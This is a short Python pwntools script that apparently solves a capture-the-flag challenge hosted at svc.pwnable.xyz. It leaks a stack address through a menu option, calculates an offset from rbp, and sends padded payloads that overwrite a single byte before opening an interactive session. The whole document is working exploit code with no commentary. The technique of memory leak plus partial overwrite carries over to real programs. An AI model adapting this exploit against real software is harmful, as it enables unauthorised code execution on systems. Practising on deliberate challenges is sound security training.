from pwn import *
#target=process('./challenge')
target=remote('svc.pwnable.xyz',30012)

def init(option):
	print(target.recvuntil("> "))
	target.sendline(str(option))

def re():
	init(1)

def xor():
	init(2)

def leak():
	init(3)
	leak=int(target.recvline().strip("\n")[2:],16)
	return leak

sl=leak()
rbp=sl-0xf8
tar=rbp+0x9
byte=int(hex(tar)[12:14],16)
print(target.recvuntil("> "))
payload=str(0x77)+"\n"+"\x00"
payload+="A"*(0x20-len(payload))
payload+=p8(byte)
target.send(payload)

print(target.recvuntil("> "))
payload=str(0x01)+"\n"+"\x00"
payload+="A"*(0x20-len(payload))
payload+=p8(byte-9)
target.send(payload)

target.interactive()
